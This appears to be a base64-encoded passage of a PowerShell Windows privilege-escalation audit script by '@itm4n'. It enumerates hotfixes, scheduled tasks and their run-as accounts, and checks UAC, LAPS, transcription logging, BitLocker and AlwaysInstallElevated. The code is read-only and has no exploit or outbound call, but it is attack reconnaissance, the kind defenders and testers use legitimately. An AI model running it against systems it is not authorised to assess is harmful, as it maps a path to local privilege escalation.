UgIkluc3RhbGxlZEJ5IiAtVmFsdWUgIiRJbnN0YWxsZWRCeSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkluc3RhbGxlZE9uIiAtVmFsdWUgJEluc3RhbGxEYXRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbdm9pZF0kQ2FjaGVkSG90Rml4TGlzdC5BZGQoJEVudHJ5KQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICMgSWYgd2UgY2FuJ3QgcmVhZCB0aGUgcmVnaXN0cnksIGZhbGwgYmFjayB0byB0aGUgYnVpbHQtaW4gJ0dldC1Ib3RGaXgnIGNtZGxldAogICAgICAgICAgICBHZXQtSG90Rml4IHwgU2VsZWN0LU9iamVjdCBIb3RGaXhJRCxEZXNjcmlwdGlvbixJbnN0YWxsZWRCeSxJbnN0YWxsZWRPbiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIFt2b2lkXSRDYWNoZWRIb3RGaXhMaXN0LkFkZCgkXykKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkQ2FjaGVkSG90Rml4TGlzdCB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkXwogICAgfQp9CgpmdW5jdGlvbiBHZXQtU2NjbUNhY2hlRm9sZGVyIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIAogICAgSGVscGVyIC0gR2V0IHRoZSBTQ0NNIGNhY2hlIGZvbGRlciBhcyBhIFBvd2VyU2hlbGwgb2JqZWN0IGlmIGl0IGV4aXN0cy4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0gKCkKCiAgICAkQ2NtQ2FjaGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggIkNDTUNhY2hlIgogICAgR2V0LUl0ZW0gLVBhdGggJENjbUNhY2hlUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5IEZ1bGxOYW1lLEF0dHJpYnV0ZXMsRXhpc3RzCn0KCmZ1bmN0aW9uIEdldC1TY2hlZHVsZWRUYXNrTGlzdCB7CiAgICA8IwogICAgLlNZTk9QU0lTCiAgICAKICAgIEhlbHBlciAtIEVudW1lcmF0ZSBhbGwgdGhlIHNjaGVkdWxlZCB0YXNrIHRoYXQgYXJlIG5vdCBkaXNhYmxlZCBhbmQgdGhhdCBhcmUgdmlzaWJsZSB0byB0aGUgY3VycmVudCB1c2VyLgogICAgCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCgogICAgLkRFU0NSSVBUSU9OCgogICAgQ29ubmVjdCB0byB0aGUgdGFzayBzY2hlZHVsZXIgc2VydmljZSBhbmQgcmV0cmlldmUgYSBsaXN0IG9mIGFsbCB0aGUgc2NoZWR1bGVkIHRhc2tzIHRoYXQgYXJlIAogICAgdmlzaWJsZSB0byB0aGUgY3VycmVudCB1c2VyLgogICAgCiAgICAuRVhBTVBMRQoKICAgIEFuIGV4YW1wbGUKICAgIAogICAgIz4KCiAgICBmdW5jdGlvbiBHZXQtU2NoZWR1bGVkVGFza3MgewoKICAgICAgICBwYXJhbSAoCiAgICAgICAgICAgIFtvYmplY3RdJFNlcnZpY2UsCiAgICAgICAgICAgIFtzdHJpbmddJFRhc2tQYXRoCiAgICAgICAgKQoKICAgICAgICAoJEN1cnJlbnRGb2xkZXIgPSAkU2VydmljZS5HZXRGb2xkZXIoJFRhc2tQYXRoKSkuR2V0VGFza3MoMCkKICAgICAgICAkQ3VycmVudEZvbGRlci5HZXRGb2xkZXJzKDApIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICBHZXQtU2NoZWR1bGVkVGFza3MgLVNlcnZpY2UgJFNlcnZpY2UgLVRhc2tQYXRoICQoSm9pbi1QYXRoIC1QYXRoICRUYXNrUGF0aCAtQ2hpbGRQYXRoICRfLk5hbWUgKQogICAgICAgIH0KICAgIH0KCiAgICB0cnkgewoKICAgICAgICBpZiAoJENhY2hlZFNjaGVkdWxlZFRhc2tMaXN0LkNvdW50IC1lcSAwKSB7CgogICAgICAgICAgICAjIElmIHRoZSBjYWNoZSBpcyBlbXB0eSwgZW51bWVyYXRlIHNjaGVkdWxlZCB0YXNrcyBhbmQgcG9wdWxhdGUgdGhlIGNhY2hlLgoKICAgICAgICAgICAgJFNjaGVkdWxlU2VydmljZSA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCgiU2NoZWR1bGUuU2VydmljZSIpCiAgICAgICAgICAgICRTY2hlZHVsZVNlcnZpY2UuQ29ubmVjdCgpCiAgICAKICAgICAgICAgICAgR2V0LVNjaGVkdWxlZFRhc2tzIC1TZXJ2aWNlICRTY2hlZHVsZVNlcnZpY2UgLVRhc2tQYXRoICJcIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgIAogICAgICAgICAgICAgICAgaWYgKCRfLkVuYWJsZWQpIHsKICAgIAogICAgICAgICAgICAgICAgICAgICRUYXNrTmFtZSA9ICRfLk5hbWUKICAgICAgICAgICAgICAgICAgICAkVGFza1BhdGggPSAkXy5QYXRoCiAgICAgICAgICAgICAgICAgICAgJFRhc2tGaWxlID0gSm9pbi1QYXRoIC1QYXRoICQoSm9pbi1QYXRoIC1QYXRoICRlbnY6d2luZGlyIC1DaGlsZFBhdGggIlN5c3RlbTMyXFRhc2tzIikgLUNoaWxkUGF0aCAkVGFza1BhdGgKICAgIAogICAgICAgICAgICAgICAgICAgIFt4bWxdJFRhc2tYbWwgPSAkXy5YbWwKICAgICAgICAgICAgICAgICAgICAkVGFza0V4ZWMgPSAkVGFza1htbC5HZXRFbGVtZW50c0J5VGFnTmFtZSgiRXhlYyIpCiAgICAgICAgICAgICAgICAgICAgJFRhc2tDb21tYW5kTGluZSA9ICIkKCRUYXNrRXhlYy5Db21tYW5kKSAkKCRUYXNrRXhlYy5Bcmd1bWVudHMpIgogICAgICAgICAgICAgICAgICAgICRQcmluY2lwYWwgPSAkVGFza1htbC5HZXRFbGVtZW50c0J5VGFnTmFtZSgiUHJpbmNpcGFsIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkQ3VycmVudFVzZXJJc093bmVyID0gJEZhbHNlCiAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoJFByaW5jaXBhbC5Vc2VySWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByaW5jaXBhbE5hbWUgPSBDb252ZXJ0LVNpZFRvTmFtZSAtU2lkICRQcmluY2lwYWwuVXNlcklkCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJChJbnZva2UtVXNlckNoZWNrKS5TSUQgLWVxICRQcmluY2lwYWwuVXNlcklkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ3VycmVudFVzZXJJc093bmVyID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkUHJpbmNpcGFsLkdyb3VwSWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByaW5jaXBhbE5hbWUgPSBDb252ZXJ0LVNpZFRvTmFtZSAtU2lkICRQcmluY2lwYWwuR3JvdXBJZAogICAgICAgICAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkVGFza0V4ZWMuQ29tbWFuZC5MZW5ndGggLWd0IDApIHsKICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlRhc2tOYW1lIiAtVmFsdWUgJFRhc2tOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHRJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVGFza1BhdGgiIC1WYWx1ZSAkVGFza1BhdGgKICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJUYXNrRmlsZSIgLVZhbHVlICRUYXNrRmlsZQogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJ1bkFzIiAtVmFsdWUgJFByaW5jaXBhbE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJFJlc3VsdEl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJDb21tYW5kIiAtVmFsdWUgJFRhc2tDb21tYW5kTGluZQogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkN1cnJlbnRVc2VySXNPd25lciIgLVZhbHVlICRDdXJyZW50VXNlcklzT3duZXIKICAgICAgICAgICAgICAgICAgICAgICAgW3ZvaWRdICRDYWNoZWRTY2hlZHVsZWRUYXNrTGlzdC5BZGQoJFJlc3VsdEl0ZW0pCiAgICAKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJUYXNrICckKCRfLk5hbWUpJyBoYXMgYW4gZW1wdHkgY21kIGxpbmUiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJUYXNrICckKCRfLk5hbWUpJyBpcyBkaXNhYmxlZCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJENhY2hlZFNjaGVkdWxlZFRhc2tMaXN0IHwgRm9yRWFjaC1PYmplY3QgeyAKICAgICAgICAgICAgJF8KICAgICAgICB9CgogICAgfSBjYXRjaCB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAkXwogICAgfQp9CiNlbmRyZWdpb24gSGVscGVycyAKCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDaGVja3MgIAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KI3JlZ2lvbiBDaGVja3MgCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCRUdJTiBDT05GSUcgICAKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmZ1bmN0aW9uIEludm9rZS1VYWNDaGVjayB7CiAgICA8IwogICAgLlNZTk9QU0lTCgogICAgQ2hlY2tzIHdoZXRoZXIgVUFDIChVc2VyIEFjY2VzcyBDb250cm9sKSBpcyBlbmFibGVkCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBUaGUgc3RhdGUgb2YgVUFDIGNhbiBiZSBkZXRlcm1pbmVkIGJhc2VkIG9uIHRoZSB2YWx1ZSBvZiB0aGUgcGFyYW1ldGVyICJFbmFibGVMVUEiIGluIHRoZQogICAgZm9sbG93aW5nIHJlZ2lzdHJ5IGtleToKICAgIEhLRVlfTE9DQUxfTUFDSElORVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxQb2xpY2llc1xTeXN0ZW0KICAgIDAgPSBEaXNhYmxlZAogICAgMSA9IEVuYWJsZWQgCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtVWFjQ2hlY2sgfCBmbAoKICAgIFBhdGggICAgICA6IFJlZ2lzdHJ5OjpIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtCiAgICBFbmFibGVMVUEgOiAxCiAgICBFbmFibGVkICAgOiBUcnVlCiAgICAKICAgIC5OT1RFUwoKICAgICJVQUMgd2FzIGZvcm1lcmx5IGtub3duIGFzIExpbWl0ZWQgVXNlciBBY2NvdW50IChMVUEpLiIKCiAgICAuTElOSwoKICAgIGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvY3VzdG9taXplL2Rlc2t0b3AvdW5hdHRlbmQvbWljcm9zb2Z0LXdpbmRvd3MtbHVhLXNldHRpbmdzLWVuYWJsZWx1YQogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgJFJlZ1BhdGggPSAiSEtFWV9MT0NBTF9NQUNISU5FXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSIKCiAgICAkSXRlbSA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggIlJlZ2lzdHJ5OjokUmVnUGF0aCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0SXRlbVByb3BlcnR5RXJyb3IKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcikgewogICAgICAgICRVYWNSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICRVYWNSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJQYXRoIiAtVmFsdWUgJFJlZ1BhdGgKICAgICAgICAkVWFjUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRW5hYmxlTFVBIiAtVmFsdWUgJEl0ZW0uRW5hYmxlTFVBCiAgICAgICAgJFVhY1Jlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAkKCRJdGVtLkVuYWJsZUxVQSAtZXEgMSkKICAgICAgICAkVWFjUmVzdWx0CiAgICB9IGVsc2UgewogICAgICAgIFdyaXRlLVZlcmJvc2UgLU1lc3NhZ2UgIkVycm9yIHdoaWxlIHF1ZXJ5aW5nICckUmVnUGF0aCciCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1MYXBzQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyB3aGV0aGVyIExBUFMgKExvY2FsIEFkbWluIFBhc3N3b3JkIFNvbHV0aW9uKSBpcyBlbmFibGVkCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBUaGUgc3RhdHVzIG9mIExBUFMgY2FuIGJlIGNoZWNrIHVzaW5nIHRoZSBmb2xsb3dpbmcgcmVnaXN0cnkga2V5LgogICAgSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdCBTZXJ2aWNlc1xBZG1Qd2QKCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXVBhcmFtKCkKICAgIAogICAgJFJlZ1BhdGggPSAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdCBTZXJ2aWNlc1xBZG1Qd2QiCgogICAgJEl0ZW0gPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6JFJlZ1BhdGgiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEdldEl0ZW1Qcm9wZXJ0eUVycm9yIAogICAgaWYgKC1ub3QgJEdldEl0ZW1Qcm9wZXJ0eUVycm9yKSB7CiAgICAgICAgJExhcHNSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAkTGFwc1Jlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlBhdGgiIC1WYWx1ZSAkUmVnUGF0aAogICAgICAgICRMYXBzUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQWRtUHdkRW5hYmxlZCIgLVZhbHVlICRJdGVtLkFkbVB3ZEVuYWJsZWQKICAgICAgICAkTGFwc1Jlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAkKCRJdGVtLkFkbVB3ZEVuYWJsZWQgLWVxIDEpCiAgICAgICAgJExhcHNSZXN1bHQKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVBvd2Vyc2hlbGxUcmFuc2NyaXB0aW9uQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIENoZWNrcyB3aGV0aGVyIFBvd2VyU2hlbGwgVHJhbnNjcmlwdGlvbiBpcyBjb25maWd1cmVkL2VuYWJsZWQKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFBvd2Vyc2hlbGwgVHJhbnNjcmlwdGlvbiBpcyB1c2VkIHRvIGxvZyBQb3dlclNoZWxsIHNjcmlwdHMgZXhlY3V0aW9uLiBJdCBjYW4gYmUgY29uZmlndXJlZCAKICAgIHRoYW5rcyB0byB0aGUgR3JvdXAgUG9saWN5IEVkaXRvci4gVGhlIHNldHRpbmdzIGFyZSBzdG9yZWQgaW4gdGhlIGZvbGxvd2luZyByZWdpc3RyeSBrZXk6CiAgICBIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcVHJhbnNjcmlwdGlvbgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLVBvd2Vyc2hlbGxUcmFuc2NyaXB0aW9uQ2hlY2sgfCBmbAoKICAgIEVuYWJsZVRyYW5zY3JpcHRpbmcgICAgOiAxCiAgICBFbmFibGVJbnZvY2F0aW9uSGVhZGVyIDogMQogICAgT3V0cHV0RGlyZWN0b3J5ICAgICAgICA6IEM6XFRyYW5zY3JpcHRzCiAgICAKICAgIC5OT1RFUwoKICAgIElmIFBvd2VyU2hlbGwgVHJhbnNjcmlwdGlvbiBpcyBjb25maWd1cmVkLCB0aGUgc2V0dGluZ3MgY2FuIGJlIGZvdW5kIGhlcmU6CgogICAgQzpcPnJlZyBxdWVyeSBIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcVHJhbnNjcmlwdGlvbgoKICAgIEhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFRyYW5zY3JpcHRpb24KICAgICAgICBFbmFibGVUcmFuc2NyaXB0aW5nICAgIFJFR19EV09SRCAgICAweDEKICAgICAgICBPdXRwdXREaXJlY3RvcnkgICAgUkVHX1NaICAgIEM6XFRyYW5zY3JpcHRzCiAgICAgICAgRW5hYmxlSW52b2NhdGlvbkhlYWRlciAgICBSRUdfRFdPUkQgICAgMHgxCiAgICAKICAgIFRvIGVuYWJsZSBQb3dlclNoZWxsIFRyYW5zY3JpcHRpb246CiAgICBHcm91cCBQb2xpY3kgRWRpdG9yID4gQWRtaW5pc3RyYXRpdmUgVGVtcGxhdGVzID4gV2luZG93cyBDb21wb25lbnRzID4gV2luZG93cyBQb3dlclNoZWxsID4gUG93ZXJTaGVsbCBUcmFuc2NyaXB0aW9uCiAgICBTZXQgYW4gb3V0cHV0IGRpcmVjdG9yeSBhbmQgc2V0IHRoZSBwb2xpY3kgYXMgRW5hYmxlZAoKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldUGFyYW0oKQoKICAgICRSZWdQYXRoID0gIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFRyYW5zY3JpcHRpb24iCgogICAgJEl0ZW0gPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICJSZWdpc3RyeTo6JFJlZ1BhdGgiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1FcnJvclZhcmlhYmxlIEdldEl0ZW1Qcm9wZXJ0eUVycm9yIAogICAgaWYgKC1ub3QgJEdldEl0ZW1Qcm9wZXJ0eUVycm9yKSB7CiAgICAgICAgIyBQb3dlclNoZWxsIFRyYW5zY3JpcHRpb24gaXMgY29uZmlndXJlZCAKICAgICAgICAkUG93ZXJzaGVsbFRyYW5zY3JpcHRpb25SZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAkUG93ZXJzaGVsbFRyYW5zY3JpcHRpb25SZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJFbmFibGVUcmFuc2NyaXB0aW5nIiAtVmFsdWUgJEl0ZW0uRW5hYmxlVHJhbnNjcmlwdGluZwogICAgICAgICRQb3dlcnNoZWxsVHJhbnNjcmlwdGlvblJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIkVuYWJsZUludm9jYXRpb25IZWFkZXIiIC1WYWx1ZSAkSXRlbS5FbmFibGVJbnZvY2F0aW9uSGVhZGVyCiAgICAgICAgJFBvd2Vyc2hlbGxUcmFuc2NyaXB0aW9uUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiT3V0cHV0RGlyZWN0b3J5IiAtVmFsdWUgJEl0ZW0uT3V0cHV0RGlyZWN0b3J5CiAgICAgICAgJFBvd2Vyc2hlbGxUcmFuc2NyaXB0aW9uUmVzdWx0CiAgICB9IAp9CgpmdW5jdGlvbiBJbnZva2UtQml0bG9ja2VyQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwogICAgCiAgICBDaGVja3Mgd2hldGhlciBCaXRMb2NrZXIgaXMgZW5hYmxlZCAod29ya3N0YXRpb25zIG9ubHkpLgogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBXaGVuIEJpdExvY2tlciBpcyBlbmFibGVkIG9uIHRoZSBzeXN0ZW0gZHJpdmUsIHRoZSB2YWx1ZSAiQm9vdFN0YXR1cyIgaXMgc2V0IHRvIDEgaW4gdGhlIAogICAgZm9sbG93aW5nIHJlZ2lzdHJ5IGtleTogJ0hLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcQml0TG9ja2VyU3RhdHVzJy4KICAgIAogICAgLkVYQU1QTEUKCiAgICBBbiBleGFtcGxlCiAgICAKICAgICM+CgogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgJE1hY2hpbmVSb2xlID0gSW52b2tlLU1hY2hpbmVSb2xlQ2hlY2sKCiAgICBpZiAoJE1hY2hpbmVSb2xlLk5hbWUgLUxpa2UgIldpbk5UIikgewoKICAgICAgICAkUmVnUGF0aCA9ICJIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcQml0TG9ja2VyU3RhdHVzIgoKICAgICAgICAkSXRlbSA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggIlJlZ2lzdHJ5OjokUmVnUGF0aCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0SXRlbVByb3BlcnR5RXJyb3IgCiAgICAgICAgaWYgKC1ub3QgJEdldEl0ZW1Qcm9wZXJ0eUVycm9yKSB7CgogICAgICAgICAgICBpZiAoLW5vdCAoJEl0ZW0uQm9vdFN0YXR1cyAtZXEgMSkpIHsKCiAgICAgICAgICAgICAgICAkQml0bG9ja2VyUmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAkQml0bG9ja2VyUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiTmFtZSIgLVZhbHVlICRSZWdQYXRoCiAgICAgICAgICAgICAgICAkQml0bG9ja2VyUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQm9vdFN0YXR1cyIgLVZhbHVlICRJdGVtLkJvb3RTdGF0dXMKICAgICAgICAgICAgICAgICRCaXRsb2NrZXJSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICJCaXRMb2NrZXIgaXNuJ3QgZW5hYmxlZC4iCiAgICAgICAgICAgICAgICAkQml0bG9ja2VyUmVzdWx0CiAgICAgICAgICAgIH0KCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICRCaXRsb2NrZXJSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAKICAgICAgICAgICAgJEJpdGxvY2tlclJlc3VsdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkUmVnUGF0aAogICAgICAgICAgICAkQml0bG9ja2VyUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiQm9vdFN0YXR1cyIgLVZhbHVlICIiCiAgICAgICAgICAgICRCaXRsb2NrZXJSZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICJCaXRMb2NrZXIgaXNuJ3QgY29uZmlndXJlZC4iCiAgICAgICAgICAgICRCaXRsb2NrZXJSZXN1bHQKICAgICAgICB9CiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1SZWdpc3RyeUFsd2F5c0luc3RhbGxFbGV2YXRlZENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBDaGVja3Mgd2hldGhlciB0aGUgQWx3YXlzSW5zdGFsbEVsZXZhdGVkIGtleSBpcyBzZXQgaW4gdGhlIHJlZ2lzdHJ5LgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgQWx3YXlzSW5zdGFsbEVsZXZhdGVkIGNhbiBiZSBjb25maWd1cmVkIGluIGJvdGggSEtMTSBhbmQgSEtDVS4gIklmIHRoZSBBbHdheXNJbnN0YWxsRWxldmF0ZWQgCiAgICB2YWx1ZSBpcyBub3Qgc2V0IHRvICIxIiB1bmRlciBib3RoIG9mIHRoZSBwcmVjZWRpbmcgcmVnaXN0cnkga2V5cywgdGhlIGluc3RhbGxlciB1c2VzIGVsZXZhdGVkCiAgICBwcml2aWxlZ2VzIHRvIGluc3RhbGwgbWFuYWdlZCBhcHBsaWNhdGlvbnMgYW5kIHVzZXMgdGhlIGN1cnJlbnQgdXNlcidzIHByaXZpbGVnZSBsZXZlbCBmb3IgCiAgICB1bm1hbmFnZWQgYXBwbGljYXRpb25zLiIKICAgIAogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbSgpCgogICAgJFJlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKCiAgICAkUmVnUGF0aCA9ICJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3